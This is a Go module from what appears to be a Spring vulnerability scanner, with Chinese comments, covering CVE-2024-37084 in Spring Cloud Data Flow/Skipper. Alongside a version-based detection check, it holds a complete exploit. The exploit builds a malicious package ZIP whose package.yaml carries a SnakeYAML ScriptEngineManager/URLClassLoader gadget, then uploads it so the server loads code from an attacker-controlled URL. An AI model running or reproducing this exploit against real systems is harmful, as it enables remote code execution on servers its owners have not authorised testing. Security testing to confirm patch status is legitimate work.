package vulns

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strconv"
	"strings"

	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2024-37084 Spring Cloud Data Flow / Skipper 上传路径未过滤导致
// 任意文件写 + SnakeYAML 反序列化 RCE。
//
// 链路：POST /api/package/upload 携带恶意 ZIP（package.yaml 的
// displayName 注入 !!javax.script.ScriptEngineManager gadget），
// 服务端用标准 Constructor 解析，上传处理阶段即触发
// URLClassLoader 回连攻击者 URL（OOB 确认）。
//
// 检测基于 /api/about 版本判定（≤2.11.3 受影响，2.11.4 修复）。
type cve202437084 struct{}

func init() { Register(&cve202437084{}) }

const (
	scdfAboutPath  = "api/about"
	scdfUploadPath = "api/package/upload"
	scdfProbeName  = "ssp-probe"
	scdfProbeVer   = "1.0.0"
	versionPattern = `"version"\s*:\s*"?(\d+\.\d+\.\d+)`
)

var scdfVersionRe = regexp.MustCompile(versionPattern)

func (c *cve202437084) Info() model.Info {
	return model.Info{
		ID:         "CVE-2024-37084",
		Name:       "Spring Cloud Data Flow/Skipper 反序列化 RCE",
		Type:       "RCE",
		Severity:   "critical",
		Affected:   "Spring Cloud Skipper/Data Flow 2.11.0-2.11.3（含 2.10.x 等旧分支），2.11.4 修复",
		Reference:  "https://spring.io/security/cve-2024-37084",
		HasExploit: true,
		ArgHint:    "攻击者可控的 HTTP 回连地址（yaml-payload 类文件所在 URL）",
	}
}

// versionAffected 判定 2.x 版本是否低于修复版 2.11.4。
func versionAffected(v string) bool {
	parts := strings.Split(v, ".")
	if len(parts) < 3 {
		return false
	}
	major, err1 := strconv.Atoi(parts[0])
	minor, err2 := strconv.Atoi(parts[1])
	patch, err3 := strconv.Atoi(parts[2])
	if err1 != nil || err2 != nil || err3 != nil {
		return false
	}
	if major != 2 {
		return major < 2 // 1.x 等旧 unsupported 版本同样受影响
	}
	return minor < 11 || (minor == 11 && patch <= 3)
}

func (c *cve202437084) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	resp, body, err := do(ctx, t, http.MethodGet, scdfAboutPath, nil, "")
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		// 无 about 端点，不具备 Skipper/SCDF API 形态
		return v, nil
	}
	b := string(body)

	lower := strings.ToLower(b)
	isRelated := strings.Contains(lower, "skipper") || strings.Contains(lower, "data flow") || strings.Contains(lower, "dataflow")

	m := scdfVersionRe.FindStringSubmatch(b)
	if m == nil {
		if isRelated {
			v.Detail = "Skipper/Data Flow API 可达但版本未知，可使用 Exploit（需自备 OOB 回连主机）确认"
		}
		// 辅助信号：HAL 能力链接（_links 含 upload/install 即具备包上传能力）
		if r3, b3, err3 := do(ctx, t, http.MethodGet, "api/package/", nil, ""); err3 == nil && r3.StatusCode == http.StatusOK {
			b3s := string(b3)
			if strings.Contains(b3s, "_links") && strings.Contains(b3s, "upload") {
				v.Detail = "Skipper API 具备包上传能力（HAL _links.upload），疑似受影响版本，建议 Exploit+OOB 确认"
			}
		}
		return v, nil
	}

	if versionAffected(m[1]) {
		v.Vulnerable = true
		v.Evidence = "报告版本 " + m[1] + " 低于修复版 2.11.4"
		v.Detail = "存在 /api/about 版本信息；实际利用需通过 Exploit 上传构造包并以 OOB 回连确认"
	} else if isRelated {
		v.Detail = "版本 " + m[1] + " 已修复（SafeConstructor），不受影响"
	}
	return v, nil
}

// buildPackageZip 构造 Skipper 要求的包结构：
// ZIP 根目录为 <name>-<version>/，内含 package.yaml。
func buildPackageZip(name, version, displayName string) ([]byte, error) {
	yaml := fmt.Sprintf(`repositoryId: 1
kind: test
repositoryName: local
apiVersion: 1.0.0
version: %s
origin: %s
displayName: %s
name: %s
`, version, name, displayName, name)

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, err := zw.Create(name + "-" + version + "/package.yaml")
	if err != nil {
		return nil, err
	}
	if _, err := w.Write([]byte(yaml)); err != nil {
		return nil, err
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// Exploit 的 arg 为攻击者可控的 HTTP 地址（yaml-payload 类文件所在 URL，
// 如 http://your-host:1339/poc）。上传处理阶段服务端即回连该地址。
func (c *cve202437084) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	displayName := fmt.Sprintf(`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["%s"]]]]`, arg)

	zipBytes, err := buildPackageZip(scdfProbeName, scdfProbeVer, displayName)
	if err != nil {
		return "", "", err
	}

	ints := make([]int, len(zipBytes))
	for i, b := range zipBytes {
		ints[i] = int(b)
	}
	payload, err := json.Marshal(struct {
		RepoName           string `json:"repoName"`
		Name               string `json:"name"`
		Version            string `json:"version"`
		Extension          string `json:"extension"`
		PackageFileAsBytes []int  `json:"packageFileAsBytes"`
	}{"local", scdfProbeName, scdfProbeVer, "zip", ints})
	if err != nil {
		return "", "", err
	}

	resp, body, err := do(ctx, t, http.MethodPost, scdfUploadPath,
		map[string]string{"Content-Type": "application/json"}, string(payload))
	if err != nil {
		return "", "", err
	}

	// 清理：删除探测包（若上传成功）
	_, _, _ = do(ctx, t, http.MethodDelete, "api/packages/"+scdfProbeName+"/"+scdfProbeVer, nil, "")

	note := "上传请求已处理：反序列化发生在服务端解析 package.yaml 时。" +
		"若漏洞存在，目标应已向你控制的地址发起 HTTP 请求（查看 OOB 服务器日志确认）。"
	if resp.StatusCode == http.StatusCreated || resp.StatusCode == http.StatusOK {
		note += "注意：服务端返回成功但未回连，通常说明已修复（SafeConstructor 将 gadget 降级为普通字符串）。"
	}
	return strings.TrimSpace(string(body)), note, nil
}
